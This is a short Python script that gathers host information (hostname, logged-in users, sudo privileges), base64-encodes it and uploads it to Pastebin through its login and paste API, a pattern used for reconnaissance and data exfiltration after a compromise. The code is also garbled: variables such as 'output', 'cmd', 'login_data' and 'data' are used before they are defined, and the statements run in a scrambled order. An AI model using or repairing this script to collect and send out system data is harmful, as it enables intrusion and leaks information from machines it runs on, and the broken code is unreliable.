import requests
import subprocess
import base64

output +=b'Hostname:   \n'+stdout+b'\n'
command = subprocess.Popen('hostname', shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
stdout,stderr = command.communicate()

output += b'Logged in users:   \n'+stdout+b'\n'
command = subprocess.Popen('w', shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
stdout,stderr = command.communicate()

output +=b'Current User Privileges:   \n'+stdout+b'\n'
command = subprocess.Popen('sudo -l', shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
stdout,stderr = command.communicate()

print(cmd)

print("Encoded result: ")
encoded_result = base64.b64encode(cmd.encode())
print(encoded_result)
text = encoded_result

logdata = {
    'devkey': '',
    'username': '',
    'password': ''
    }
 
login = requests.post("https://pastebin.com/api/api_login.php", data=login_data)
print("Login status: ", login.status_code if login.status_code != 200 else "OK/200")
print("User token: ", login.text)
data['userkey'] = login.text
 
r = requests.post("https://pastebin.com/api/api_post.php", data=data)
print("Paste URL: ", r.text)